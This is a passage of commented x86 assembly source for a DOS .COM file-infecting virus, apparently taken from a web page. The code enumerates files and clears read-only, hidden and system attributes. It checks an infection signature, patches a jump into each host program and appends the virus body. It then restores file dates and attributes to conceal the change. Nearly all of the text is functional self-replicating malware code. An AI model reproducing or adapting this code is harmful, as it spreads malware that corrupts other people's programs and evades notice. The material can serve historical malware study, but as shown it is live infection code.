                                        ;DS:DX points to the search string                      STACK
        mov     ah, 4eh                 ;find first matching directory entry                    FCB drives  (word)
        mov     cx, 111b                ;only default directory, FILES                         
                                        ;hidden, system and normal
        int     21h                     ;doit                                       bp-->       44 byte DTA buffer
                                        ;                                                       infected count (word)
        jnc     Research                ;carry is clear when a file was             sp-->       6 byte buffer
        jmp     nofile                  ;found.


ReSearch:
;All handle based DOS calls take a pointer to an ASCIIZ file name in ds:dx
        lea     dx, file_name

;Since this is a virus, we want to infect files that can't be touched by
;DOS commands, this means readonly, system, and hidden files are at our
;mercy.  To do this, we rely on the findfrst/next attributes and other data
;to restore the attribute byte to the original settings.  get/SET can fix
;them to be suitable
        mov     cl, attributes
        and     cl, 11100000b           ;not readonly, system, or hidden                        STACK
                                        ;                                                       FCB drives
        mov     ax, 4301h               ;set attributes                              bp-->      buffer (44 bytes)
        int     21h                     ;                                                       buffer (6 bytes)
                                        ;                                            sp-->      infected_count
        jnc     NoError                 ;check for error
        jmp     Restore_Flags
NoError:
        mov     ax, 3d02h               ;now, open file using handle,
                                        ;read/write access
        int     21h                     ;
        jnc     NoError2                ;IF there was an error, we are done
        jmp     Restore_Flags           ;But we don't need to commit or close

NoError2:
        mov     bx, ax                  ;The handle was returned in ACC.
                                        ;Howwever, all handle based DOS
                                        ;calls expect it in BX


;We don't want to infect the program more than once, so we will
;check to see if it is infected. 


        mov     ax, 4200h               ;seek relative to start of file
        ;       bx contains handle from open operation
        xor     cx,cx                   ;cx:dx is file pointer
        xor     dx, dx                  ;
        int     21h                     ;DOIT

;Now, we will read in enough data to see if we have our virus signature.
        mov     ah, 3fh                 ;read data
	lea     dx, [si-(offset reference-offset original_code)]
					;into original_code buffer
	mov     cx, 5                   ;5h bytes
	;       bx contains handle from last operation
	int     21h

	cmp     word ptr [si-(offset reference-offset original_code)+3], 0fafah
	jne     GoApe                   ;if we aren't already infected,
	jmp     Error                   ;go for it

GoApe:
;Since it is safe to infect, we will
        mov     ax, 4202h               ;seek end of file
        xor     cx, cx                 
        xor     dx, dx
        int     21h

        or      dx, dx                  ;check for valid .COM format
        jz      Less_Than_64K
        jmp     Error

Less_Than_64K:

;Now, we must calculate WHERE the jump will be to.  Let's examine the program
;Structure:
;jmp near ptr xxxx
;Cli Cli                       }These add up to the original length
;Orignal code sans 5 bytes

;Original_Code (5 bytes)       }The length of all virus data
;Other virus data               is equal to the difference in
;Infect                         the addresses of Infect and Original_Code

;End_Virus


;Thus, the jump must jump TO (offset Infect- offset Original_Code + Original_Length + origin)
;However, in the 80x86, NEAR jumps are calculated as an offset from the position
;of the next statement to execute (because of fetch/execute cycle operation).

;Since jmp near ptr xxxx takes 3 bytes, the next instruction is THREE bytes from
;The 0E9h jmp near instruction, so xxxx will be (offset Infect-Offset Original_Code
;+Original_Length-3);

        ;Since AX already contains the original length, we will merely add
        ;Space for the virus data, and take care of the three bytes
        ;of code generated by the jmp near instruction.

        add     ax, (offset Infect - Offset Original_Code -3)

                                        ;calculate jump address
        mov     byte ptr [bp-8], 0e9h   ;jmp near instruction
        mov     word ptr [bp-7], ax     ;offset for near jmp
        mov     word ptr [bp-5], 0fafah ;cli cli

        mov     ax, 4200h               ;seek begining of file
        xor     cx, cx
        mov     dx, cx
        int     21h

        mov     ah, 40h                 ;write patched code
        mov     cx, 5                   ;5 bytes of code
        lea     dx, [bp-8]              ;our buffer
        int     21h

        mov     ax, 4202h               ;seek EOF
        xor     cx, cx
        xor     dx, dx
        int     21h


	lea     dx, [si - (offset Reference - offset Original_Code)]; set start
	mov     cx, (offset End_Virus - offset Original_Code)     ;set length
	mov     ah, 40h         ;append virus to file
	int     21h             ;doit

        inc     infected_Count  ;bump up the number of programs infected

Error:  mov     dx,date_stamp           ;restore date
        mov     cx,time_stamp           ;restore time
        mov     ax, 5701h               ;set them
        int     21h

        mov     ah, 3eh                 ;close file
        int     21h

Restore_Flags:
        xor     ch, ch                  ;zero hi byte flags
        mov     cl,attributes           ;restore flags
        lea     dx, file_name           ;ds:dx points to ASCIIZ string
                                        ;in the buffer, offset 1eh contains
                                        ;the file name
        mov     ax, 4301h               ;get/SET flags
        int     21h                     ;Doit

DoAgain:;See if we're done infecting
        cmp     infected_count, infect_per_run
        jae     NoFile                  ;if we're done, same as no new file


        mov     ah,  4fh                ;find next
        int     21h

        jc      NoFile                  ;if carry is clear, DOIT again!
        jmp     ReSearch

;Since we have no more files, we will restore things to normal.
NoFile:
        mov     dx, 80h                 ;reset default dta at DS:80h
        mov     ah, 1ah                 ;set DTA
        int     21h

        add     sp, 52                  ;deallocate buffers and infected_count



;Put original code of program BEFORE it was infected back in place!


Done:   
        pop     ax                      ;restore ax


        ;FUNKY code!  In the 80x86, all NEAR or SHORT jmp opcodes take
        ;a RELATIVE address...... BUT a retn opcode pops a near absolute
        ;address of the stack - saves us the trouble of some calculating
        ;relative to here, and the trouble of a self-modifying
        ;far absolute jmp! (5 bytes)

        mov     bx, 0100h
        push    bx
        ret                             ;easiest jump to cs:100

End_Virus:
_TEXT ends
end start


</textarea></td></tr></table></body></html>
